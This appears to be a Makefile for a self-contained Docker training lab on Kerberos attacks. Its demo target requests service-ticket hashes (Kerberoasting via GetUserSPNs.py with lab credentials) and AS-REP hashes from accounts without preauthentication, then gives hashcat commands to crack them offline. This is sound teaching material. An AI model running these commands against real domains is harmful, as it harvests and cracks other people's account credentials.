# Module 03 — Kerberos Attacks lab.
# Standard targets: up / down / reset / demo / shell
.PHONY: up down reset demo shell

up:         ## Build and start the DC + attacker container
	docker compose up -d --build

down:       ## Stop and remove containers
	docker compose down

reset:      ## Tear down completely
	docker compose down --rmi local --volumes --remove-orphans

shell:      ## Open a shell in the attacker container
	docker compose exec attacker bash

demo:       ## Request REAL TGS-REP / AS-REP hashes from the live Samba DC
	@echo "=== Waiting for KDC... ==="
	docker compose exec attacker sh -c \
	    'until python3 -c "import socket; socket.create_connection((\"dc01.corp.local\", 88), 3)" 2>/dev/null; do sleep 3; done; echo "KDC reachable."'
	@echo ""
	@echo "=== 1. Kerberoasting — requesting REAL TGS-REP tickets for every SPN ==="
	@echo "    (the \$$krb5tgs\$$23 hashes below are LIVE from the DC; crack with hashcat -m 13100)"
	docker compose exec attacker sh -c \
	    'GetUserSPNs.py CORP.LOCAL/jsmith:"Welcome1!" -dc-ip 10.10.0.10 -request \
	        -outputfile /tmp/spn-hashes.txt 2>/dev/null; \
	     grep "^\$$krb5tgs" /tmp/spn-hashes.txt || \
	     echo "[!] No TGS returned — check the DC is healthy (make logs on 02-enumeration)"'
	@echo ""
	@echo "=== 2. AS-REP Roasting — no password required ==="
	@echo "    (the \$$krb5asrep hashes below are LIVE; crack with hashcat -m 18200)"
	docker compose exec attacker sh -c \
	    'GetNPUsers.py CORP.LOCAL/ -dc-ip 10.10.0.10 -no-pass \
	        -usersfile /data/userlist.txt -format hashcat 2>/dev/null \
	        | grep "^\$$krb5asrep" || \
	     echo "[!] No AS-REP returned — confirm svc-legacy has DONT_REQUIRE_PREAUTH set"'
	@echo ""
	@echo "=== 3. Crack the live hashes offline ==="
	@echo "   make shell, then:"
	@echo "     hashcat -m 13100 /tmp/spn-hashes.txt /data/wordlist.txt   # TGS-REP"
	@echo "   data/wordlist.txt seeds the weak service-account passwords so cracking is deterministic;"
	@echo "   swap in rockyou.txt for the realistic run."
	@echo ""
	@echo "=== Demo complete. Run 'make shell' to explore interactively. ==="
